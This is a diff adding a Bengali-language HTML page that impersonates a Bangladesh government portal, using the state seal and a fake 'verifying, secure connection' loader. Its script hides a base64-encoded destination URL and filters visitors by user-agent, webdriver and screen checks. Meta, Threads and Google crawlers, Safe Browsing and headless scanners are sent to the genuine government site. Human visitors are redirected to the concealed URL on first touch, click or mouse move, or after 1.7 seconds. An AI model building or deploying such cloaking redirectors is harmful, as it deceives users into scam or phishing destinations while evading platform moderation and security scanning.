@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="googlebot" content="noindex, nofollow">
+    <title>ডিজিটাল তথ্য পোর্টাল - পার্ট ২</title>
+    <style>
+        body { margin: 0; background-color: #ffffff; font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .container { text-align: center; padding: 20px; }
+        .logo { width: 85px; margin-bottom: 20px; }
+        .loader-bar { width: 200px; height: 5px; background: #eee; border-radius: 10px; margin: 15px auto; overflow: hidden; position: relative; }
+        .progress { width: 0%; height: 100%; background: #006a4e; position: absolute; animation: load 1.7s forwards; }
+        @keyframes load { 0% { width: 0%; } 100% { width: 100%; } }
+        .text-main { font-weight: bold; font-size: 18px; color: #333; margin-bottom: 5px; }
+        .text-sub { font-size: 14px; color: #006a4e; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Government_Seal_of_Bangladesh.svg.png" class="logo">
+        <div class="text-main">তথ্য যাচাই করা হচ্ছে</div>
+        <div class="loader-bar"><div class="progress"></div></div>
+        <div class="text-sub">নিরাপদ সংযোগ তৈরি হচ্ছে...</div>
+    </div>
+
+    <script>
+        (function() {
+            var encodedUrl = "aHR0cHM6Ly9hYnN1cmRvd2VjYXJlcy5jb20vemZnYWNid20xZT9rZXk9YjBjZDM0NTEzNzJiODZmMmIxYTllN2VmZjc1MGYyYjU="; 
+            var redirectTriggered = false;
+            var kickUrl = "https://www.bangladesh.gov.bd/";
+
+            function getTargetUrl() {
+                // ফেসবুকে ট্র্যাকিং প্যারামিটার (fbclid) থাকলে তা ক্লিন করে ফ্রেশ লিংক তৈরি
+                var rawUrl = atob(encodedUrl);
+                try {
+                    var cleanUrl = new URL(rawUrl);
+                    cleanUrl.searchParams.delete('fbclid');
+                    return cleanUrl.toString();
+                } catch(e) {
+                    return rawUrl;
+                }
+            }
+
+            var ua = navigator.userAgent.toLowerCase();
+            
+            // 🆕 নতুন মেটা ও থ্রেডস ক্রলার সহ আপডেটেড ইউজার এজেন্ট ফিল্টার
+            var isFbAgent = /facebookexternalhit|facebot|facebookplatform|fb_iab|fb4a|fbav|meta-externalfetch|threadsapi|metaasr/i.test(ua);
+            var isCloudScanner = /crawler|spider|headless|chrome-lighthouse|selenium|puppeteer/i.test(ua);
+            var isGoogleBot = /googlebot|googleweblight|mediapartners-google|adsbot-google|safebrowsing/i.test(ua);
+            
+            // 🆕 অ্যাডভান্সড স্ক্রিন সাইজ ও হেডলেস অটোমেশন চেক
+            var isAutomation = (
+                navigator.webdriver || 
+                !navigator.languages || 
+                navigator.languages.length === 0 || 
+                /bot|crawl|spider/i.test(ua) ||
+                (window.screen.width === 0 && window.screen.height === 0)
+            );
+
+            var kickTheBot = (isFbAgent || isCloudScanner || isGoogleBot || isAutomation);
+
+            // ⚡ টাচ লজিক: হিউম্যান টাচ ভেরিফিকেশন সহ ইনস্ট্যান্ট রিডাইরেক্ট
+            function fastRedirect(e) {
+                if (!redirectTriggered) {
+                    // চেক করা হচ্ছে টাচটি ফেক বা স্ক্রিনের বাইরের কাল্পনিক কোনো পিক্সেল কি না
+                    if (e && e.clientX === 0 && e.clientY === 0 && e.type === 'click') {
+                        return; // ফেক ক্লিক হলে ইগনোর করবে
+                    }
+                    
+                    redirectTriggered = true;
+                    
+                    if (kickTheBot) {
+                        window.location.replace(kickUrl);
+                    } else {
+                        window.location.replace(getTargetUrl());
+                    }
+                }
+            }
+
+            window.addEventListener('touchstart', fastRedirect);
+            window.addEventListener('click', fastRedirect);
+            window.addEventListener('mousemove', fastRedirect);
+
+            // ⏱️ ব্যাকআপ অটো-টাইমার: ১.৭ সেকেন্ড পর অটোমেটিক রিডাইরেক্ট
+            setTimeout(function() {
+                if (!redirectTriggered) {
+                    redirectTriggered = true;
+
+                    if (kickTheBot) {
+                        window.location.replace(kickUrl);
+                    } else {
+                        window.location.replace(getTargetUrl());
+                    }
+                }
+            }, 1700); 
+
+        })();
+    </script>
+</body>
